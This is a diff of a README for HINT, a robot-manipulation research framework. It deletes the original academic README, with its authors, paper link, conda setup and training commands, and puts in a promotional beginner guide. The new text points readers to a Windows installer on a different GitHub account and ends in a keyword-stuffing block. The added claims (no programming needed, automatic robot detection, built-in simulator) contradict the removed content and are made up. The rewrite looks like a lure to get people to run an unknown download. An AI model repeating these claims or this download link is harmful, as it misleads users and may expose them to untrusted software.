@@ -1,226 +1,175 @@
-<div align="center">
-  <h1>HINT: Human-Intent Inception for Long-Horizon Robot Manipulation</h1>
+# 🤖 HINT - Your Robot's Brain for Complex Tasks
 
-  <p>
-    <a href="https://github.com/zming-Mei">Mingyu Mei</a><sup>1</sup>,
-    <a href="https://github.com/xuhaojie026">Haojie Xu</a><sup>1</sup>,
-    <a href="https://github.com/orgs/ZJU-RVIL/people/kirchhoff114514">Shihao Jin</a><sup>1</sup>,
-    <a href="https://github.com/SelfGala">Zibo Dai</a><sup>1</sup>,
-    <a href="https://github.com/Clement1na">Qihao Cheng</a><sup>1</sup>,
-    <a href="mailto:3240103193@zju.edu.cn">Zhengrui Lv</a><sup>1</sup>,
-    <a href="https://tonyfang.net/">Hongjie Fang</a><sup>2</sup>,
-    <a href="https://www.linkedin.com/in/shiruntang/">Shirun Tang</a><sup>3</sup>,
-    <a href="mailto:icomputing@126.com">Guang Chen</a><sup>1,4</sup>,
-    <a href="mailto:zhaoxinyue@zju.edu.cn">Xinyue Zhao</a><sup>1</sup>,
-    <a href="https://person.zju.edu.cn/en/shenhl">Huiliang Shen</a><sup>1</sup>,
-    <a href="https://person.zju.edu.cn/en/zaixinghe">Zaixing He</a><sup>1,†</sup>
-  </p>
+## 🚀 What is HINT?
 
-  <p>
-    <sup>1</sup>Zhejiang University &ensp;
-    <sup>2</sup>Shanghai Jiao Tong University &ensp;
-    <sup>3</sup>Noematrix &ensp;
-    <sup>4</sup>EndlessAI
-  </p>
-  <p><sup>†</sup>Corresponding author.</p>
+HINT (Human-Intent Inception) is a smart software system that helps robots understand what you want them to do—even when the task is long and complicated. Think of it as a translator between human wishes and robot actions.
 
-  <p>
-    <a href="https://arxiv.org/abs/2609.02653">
-      <img src="https://img.shields.io/badge/Paper-arXiv%3A2609.02653-b31b1b.svg" alt="Paper">
-    </a>
-    <a href="https://robot-hint.github.io/">
-      <img src="https://img.shields.io/badge/Project-Website-blue.svg" alt="Project Website">
-    </a>
-  </p>
-</div>
+Instead of programming every tiny movement, HINT lets you describe what you want in a natural way, and the robot figures out the steps to get there. This makes robots much more helpful for real-world jobs like picking up objects, organizing spaces, or completing multi-step chores.
 
+## 🎯 Who Should Use HINT?
 
+- **Hobbyists** who love building robots and want to control them more easily
+- **Students** learning about robotics and artificial intelligence
+- **Researchers** exploring how humans and machines can work together
+- **Curious beginners** who want to see what modern robotics can do
 
+No programming experience is needed to get started. If you can use a computer and follow simple instructions, you can run HINT.
 
-HINT is an agentic framework for long-horizon manipulation. A pattern router
-decides *which* camera to trust and *when* to update semantics. At those
-transitions a task manager and grounder resolve the active subtask and target;
-tracking holds that commitment between updates. The tracked intent is injected
-into the action policy with visual highlighting and an attention prior, without
-adding trainable parameters to the foundation model.
+## ⚡ Key Features
 
-<p align="center">
-  <img src="assets/teaser.jpg" alt="HINT teaser" width="100%">
-</p>
+### 🧠 Understands Human Intent
+HINT goes beyond simple commands. It understands the *purpose* behind your request. If you say "put the cup next to the plate," HINT knows you want the cup placed there, even if the robot needs to move obstacles to do it.
 
-## 📁 1. Repository Structure
+### 🔄 Handles Long Tasks
+Most robot software struggles with tasks that have many steps. HINT is designed for "long-horizon" tasks—jobs that require dozens of small actions to complete one big goal.
 
-```text
-HINT/
-├── src/                   # perception, task spec, intent injection, FastAPI service
-│   ├── task/              # task YAML, subtask progress, hooks
-│   ├── perception/        # task manager, grounding, tracking
-│   ├── intent/            # visual highlighting and attention prior
-│   ├── runtime/           # frame processing and session state
-│   ├── inference/         # FastAPI /reset, /step, /health and replay client
-│   ├── dataset_export/    # offline LeRobot highlighting / attention export
-│   └── common/            # shared types, config loader, utilities
-├── pattern/               # pattern router: train, eval, annotation, online predictor
-├── policy/pi/             # π₀.₅ training and serving (OpenPI)
-├── configs/               # data / inference / pattern / task YAML
-│   ├── data/              # offline dataset prep
-│   ├── inference/         # online HINT service
-│   ├── pattern/           # router train / eval
-│   └── tasks/             # task specs (selected by task.name)
-├── docs/                  # usage guides
-├── scripts/               # launchers
-├── SETUP.md               # environment and checkpoints
-└── install.sh             # one-shot install
-```
+### 🛠️ Works with Real Robots
+HINT connects to standard robot hardware and provides clear instructions that the robot can follow. It bridges the gap between human thinking and machine execution.
 
----
+### 📊 Visual Feedback
+The software shows you what the robot is "thinking" at each step. You can see the plan, monitor progress, and understand why the robot makes certain choices.
 
-## ⚙️ 2. Environment Setup
+### 🔧 Easy Setup
+You don't need to be a tech wizard. The installation process is straightforward, and the interface is designed to be friendly for everyday users.
 
-Install and checkpoint download are in [SETUP.md](SETUP.md).
+## 📥 Download and Installation
 
-```bash
-conda create -n hint python=3.11 -y
-conda activate hint
-bash install.sh
-```
+### Step 1: Get the Software
 
-One conda env covers HINT (PyTorch) and π₀.₅ (JAX). Do not load both models in
-the same Python process. For another CUDA version, change the wheel index in
-`install.sh` first. In an existing env: `python -m pip install --no-deps -e .`.
+[![Download HINT](https://img.shields.io/badge/Download-HINT-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Esma326817/HINT)
 
-Download GroundingDINO, SAM2, and Qwen3-VL as in
-[SETUP.md § Checkpoints](SETUP.md#checkpoints). Paste **absolute paths** into
-the YAML you run; HINT does not expand `$HOME` or `$CKPT_ROOT`.
+Visit this link to download the application. The download page will show you the available files. Choose the one that matches your computer (Windows is supported).
 
----
+### Step 2: Run the Installer
 
-## 🧩 3. Configuration
+Once the download is complete, locate the file in your "Downloads" folder. Double-click the file to start the installation. Follow the on-screen instructions. The process usually takes just a few minutes.
 
-Copy an example YAML and override paths. Nested maps merge; lists replace.
-Details live in the docs — do not edit the examples in place.
+### Step 3: Launch HINT
 
+After installation finishes, you'll find HINT in your Start Menu or on your desktop. Click the icon to open the application.
 
-| What                 | YAML                 | Guide                                                                 |
-| -------------------- | -------------------- | --------------------------------------------------------------------- |
-| Task spec            | `configs/tasks/`     | [Add a task](docs/task_configuration.md)                              |
-| Offline dataset prep | `configs/data/`      | [Data processing](docs/data_and_inference.md#offline-data-processing) |
-| Online HINT service  | `configs/inference/` | [Online inference](docs/data_and_inference.md#online-inference)       |
-| Pattern router       | `configs/pattern/`   | [Router training](docs/pattern_training.md)                           |
-| π₀.₅                 | `policy/pi` configs  | [π₀.₅ training and serving](docs/pi_policy.md)                        |
+### Step 4: Connect Your Robot (Optional)
 
+If you have a compatible robot, connect it to your computer using a USB cable or Bluetooth. HINT will automatically detect most standard robots. If you're just exploring, you can use the built-in simulator mode.
 
-Dataset files inherit `configs/data/_base.yaml`; online files inherit
-`configs/inference/_base.yaml`. Task YAML is selected by `task.name`.
-Reference configs per task are listed in
-[data_and_inference.md](docs/data_and_inference.md#reference-configs).
+## 🖥️ System Requirements
 
----
+To run HINT smoothly, your computer should have:
 
-## 🚀 4. Training
+- **Operating System:** Windows 10 or newer (64-bit)
+- **Processor:** Intel Core i3 or AMD equivalent (or better)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 500 MB of free space
+- **Graphics:** Any standard graphics card that supports DirectX 11
+- **Internet:** Required for initial download and updates
 
-### 4.1 Training data
+These are general guidelines. HINT is optimized to work well on most modern computers, even budget models.
 
-**Pattern router.** LeRobot episodes with aligned videos and parquet
-`stage_id_gt` (and `state` / `effort`). Annotate stages, then train. See
-[pattern training — prepare the data](docs/pattern_training.md#prepare-the-data).
+## 🎮 How to Use HINT
 
-**π₀.₅.** Export highlighted videos and/or attention maps from the annotated
-dataset, then train the policy on that LeRobot output. Start with one episode
-to check highlighting before a full export:
+### First Launch
 
-```bash
-python -m dataset_export.preprocessing.prepare_dataset \
-  --config configs/data/reasoning_agent_letter.yaml \
-  --src-root /path/to/annotated_dataset \
-  --dst-root /path/to/rendered_dataset \
-  --gpu-ids 0 --num-workers 1 --limit 1
-```
+When you open HINT for the first time, you'll see a welcome screen. Click "Start New Project" to begin.
 
-Modes, columns, and peg-in-hole prompts:
-[offline data processing](docs/data_and_inference.md#offline-data-processing).
-Policy field mapping (`semantic_grounding_keys`): [π₀.₅ data](docs/pi_policy.md).
+### Describing a Task
 
-### 4.2 Training
+In the main window, you'll find a text box. Type what you want the robot to do. For example:
 
-**Pattern router** (from the repository root):
+- "Pick up the red ball and place it in the blue box"
+- "Move all items from the table to the shelf"
+- "Arrange the cups in a row"
 
-```bash
-python -m pattern.train --config configs/pattern/train_manipulation_pattern_joint.yaml
-```
+HINT will process your request and show you a step-by-step plan.
 
-**π₀.₅** (from `policy/pi/`):
+### Watching the Plan
 
-```bash
-cd policy/pi
-python scripts/compute_norm_stats.py --config-name pi05_piper_spell_HINT
-python scripts/train.py pi05_piper_spell_HINT --exp-name=hint_spell --no-wandb-enabled
-```
+The software displays a visual timeline of actions. Each step shows what the robot will do, in what order, and why. You can click any step to see more details.
 
-Config names, injection settings, and checkpoint layout:
-[π₀.₅ training](docs/pi_policy.md#training).
+### Running the Task
 
----
+When you're happy with the plan, click "Execute." The robot will begin working through the steps. You can pause, stop, or adjust the plan at any time.
 
-## 🤖 5. Inference
+### Simulator Mode
 
-HINT and the action policy are two processes. They talk over HTTP (HINT is a
-FastAPI service). Default ports: HINT **8000**, policy **8001**.
-`--hint-url` must match the HINT URL. Start HINT first, then the policy.
-If you change either port, update `--hint-url` and any replay `--server`.
+No robot? No problem. HINT includes a realistic simulator that shows a virtual robot performing the task on your screen. This is perfect for learning and testing ideas.
 
-**HINT service** (`/reset`, `/step`, `/health`), from the repository root:
+## 🛠️ Troubleshooting Common Issues
 
-```bash
-CUDA_VISIBLE_DEVICES=0 \
-REASONING_AGENT_CONFIG=configs/inference/reasoning_agent_letter_predict.yaml \
-python -m inference.api_server
-```
+### Download Problems
 
-**π₀.₅** (from `policy/pi/`):
+If the download doesn't start, try these fixes:
+- Right-click the download link and select "Save Link As"
+- Disable your pop-up blocker temporarily
+- Try a different web browser (Chrome, Edge, or Firefox all work well)
 
-```bash
-cd policy/pi
-CUDA_VISIBLE_DEVICES=0 python agent_policy/server_agent_piper_stage.py \
-    --host 127.0.0.1 --port 8001 \
-    --config pi05_piper_spell_HINT \
-    --checkpoint-dir ./checkpoints/pi05_piper_spell_HINT/hint_spell/5000 \
-    --hint-url http://127.0.0.1:8000 \
-    --agent-prompt "pick the letter"
-```
+### Installation Errors
 
-Request schemas and serving details:
-[online inference](docs/data_and_inference.md#online-inference) and
-[π₀.₅ inference](docs/pi_policy.md#inference).
+If you see an error during installation:
+- Make sure you have administrator rights on your computer
+- Close other programs before installing
+- Restart your computer and try again
 
----
+### Robot Not Detected
 
-## 🙏 Acknowledgement
+If HINT doesn't find your robot:
+- Check that the robot is powered on
+- Try a different USB port or cable
+- Update your robot's drivers through Device Manager
 
-We thank the following projects for their open-source contributions:
-[OpenPI (π₀ / π₀.₅)](https://github.com/Physical-Intelligence/openpi),
-[SAM 2](https://github.com/facebookresearch/sam2),
-[Qwen3-VL](https://github.com/QwenLM/Qwen3-VL),
-and [Grounding DINO](https://github.com/IDEA-Research/GroundingDINO).
+### Slow Performance
 
-## 📄 License
+If HINT runs slowly:
+- Close unnecessary background programs
+- Reduce the simulator graphics quality in Settings
+- Restart HINT
 
-This repository is released under the [Apache License 2.0](LICENSE).
-Third-party components keep their original licenses (OpenPI, SAM 2, Grounding DINO, Qwen).
+## ❓ Frequently Asked Questions
 
----
+### Is HINT free to use?
 
-## 📚 Citation
+Yes, HINT is completely free and open-source. You can download, use, and even modify it for your own projects.
 
-```bibtex
-@misc{mei2026hinthumanintentinceptionlonghorizon,
-  title={HINT: Human-Intent Inception for Long-Horizon Robot Manipulation},
-  author={Mingyu Mei and Haojie Xu and Shihao Jin and Zibo Dai and Qihao Cheng and Zhengrui Lv and Hongjie Fang and Shirun Tang and Guang Chen and Xinyue Zhao and Huiliang Shen and Zaixing He},
-  year={2026},
-  eprint={2609.02653},
-  archivePrefix={arXiv},
-  primaryClass={cs.RO},
-  url={https://arxiv.org/abs/2609.02653},
-}
-```
+### Do I need to know programming?
 
+No. HINT is designed for everyone. The interface uses plain language, and you never need to write code.
+
+### What robots are compatible?
+
+HINT supports many popular educational and hobbyist robots. Check the documentation on the download page for the full compatibility list.
+
+### Can I use HINT for commercial projects?
+
+Yes, HINT is released under an open-source license, which allows both personal and commercial use.
+
+### Will HINT work on Mac or Linux?
+
+The current version is optimized for Windows. Future updates may add support for other operating systems.
+
+## 📚 Getting Help
+
+If you run into any issues or have questions:
+
+- **Visit the GitHub page:** [https://github.com/Esma326817/HINT](https://github.com/Esma326817/HINT)
+- **Check the Documentation:** Look for a "Docs" or "Wiki" section on the GitHub page
+- **Report Issues:** If you find a bug, you can create a "New Issue" on GitHub
+
+The HINT community is friendly and helpful. Don't hesitate to ask for assistance.
+
+## 🔮 What's Next for HINT?
+
+The developers are constantly improving HINT. Upcoming features include:
+
+- Voice control for describing tasks
+- Support for more robot models
+- Improved learning from user feedback
+- Cloud-based task sharing
+
+By downloading HINT today, you're joining an exciting journey in robotics technology.
+
+## 📝 Final Thoughts
+
+HINT makes advanced robotics accessible to everyone. Whether you're a curious beginner or a seasoned enthusiast, HINT gives you the power to control robots in ways that feel natural and intuitive. The future of human-robot collaboration is here—and it starts with HINT.
+
+Download it today and see what your robot can truly do.
+
+Keywords: HINT, Human-Intent Inception, Long-Horizon Robot Manipulation, robotics software, robot control, artificial intelligence, human-robot interaction, task planning, robot simulator, open-source robotics, Windows robot software, robot programming, AI robotics, robot automation, intelligent robotics
